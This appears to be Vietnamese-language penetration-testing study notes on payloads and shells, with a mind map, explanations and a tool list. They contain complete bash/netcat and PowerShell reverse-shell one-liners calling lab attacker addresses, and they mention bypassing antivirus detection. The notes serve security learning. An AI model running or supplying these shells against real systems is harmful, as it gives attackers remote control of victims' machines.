@@ -1,0 +1,93 @@
+Payloads & Shells
+│
+├── Khái niệm
+│   ├── Payload = mã khai thác
+│   └── Shell = môi trường điều khiển
+│
+├── One-liners
+│   ├── Bash/Netcat reverse
+│   └── PowerShell reverse
+│
+├── Script Payloads
+│   └── Nishang Invoke-PowerShellTcp
+│
+├── Đặc điểm
+│   ├── OS-specific
+│   ├── Hình thức: 1 dòng / script / auto
+│   └── Tránh AV detection
+│
+└── Công cụ
+    ├── Metasploit
+    ├── MSFvenom
+    └── Netcat / Powercat
+
+
+
+
+1. Khái niệm cơ bản
+  Payload: trong bảo mật, là đoạn lệnh hoặc mã khai thác lỗ hổng của HĐH / ứng dụng.
+    → Chính là phần “thực hiện hành động độc hại”.
+  Shell: môi trường cho phép tương tác với hệ thống (qua reverse shell, bind shell, web shell…).
+  Payloads thường được AV/EDR chặn vì chúng chứa lệnh nguy hiểm. Hiểu rõ cách hoạt động giúp ta bypass được.
+
+2. Ví dụ Payload One-liner
+  🔹 Netcat/Bash Reverse Shell
+      rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
+        rm -f /tmp/f: xóa file nếu có.
+        mkfifo /tmp/f: tạo FIFO named pipe.
+        cat /tmp/f |: đọc từ pipe chuyển sang input của lệnh tiếp theo.
+        /bin/bash -i 2>&1 |: chạy shell tương tác, redirect cả stdout & stderr.
+        nc 10.10.14.12 7777 > /tmp/f: kết nối tới attacker, gửi shell ra ngoài.
+  👉 Kết quả: mở reverse shell từ victim về attacker.
+
+  🔹 PowerShell Reverse Shell
+    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
+    $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
+    while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
+    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback = (iex $data 2>&1 | Out-String);
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+      Giải thích 
+        -nop -c: chạy không load profile, thực thi command.
+        TCPClient: mở kết nối TCP tới attacker.
+        GetStream(): tạo stream dữ liệu.
+        whi le loop: đọc dữ liệu từ attacker.
+        Invoke-Expression (iex): chạy lệnh attacker gửi tới.
+        Trả kết quả: gửi ngược output về qua TCP.
+👉 Cho phép attacker có PowerShell interactive shell trên victim.
+
+3. Script Payloads (ví dụ Nishang – Invoke-PowerShellTcp)
+    Hỗ trợ Reverse hoặc Bind shell.
+    Có thể dùng cả IPv4 & IPv6.
+    Cho phép attacker:
+      Kết nối vào victim (bind).
+      Victim chủ động kết nối ra ngoài (reverse).
+
+4. Đặc điểm Payloads
+    Hình thức đa dạng:
+      One-liner (dễ copy-paste).
+      Script (.ps1, .sh).
+      Auto-generated (MSFvenom, Metasploit).
+    Tùy OS / shell / ngôn ngữ trên target → chọn payload phù hợp.
+    Mục tiêu cuối: có được shell điều khiển hệ thống.
+
+5. Công cụ hỗ trợ
+  Metasploit Framework: tạo payload, listener, exploit tự động.
+  MSFvenom: crafting payload.
+  Netcat / Powercat: lắng nghe kết nối hoặc gửi payload.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
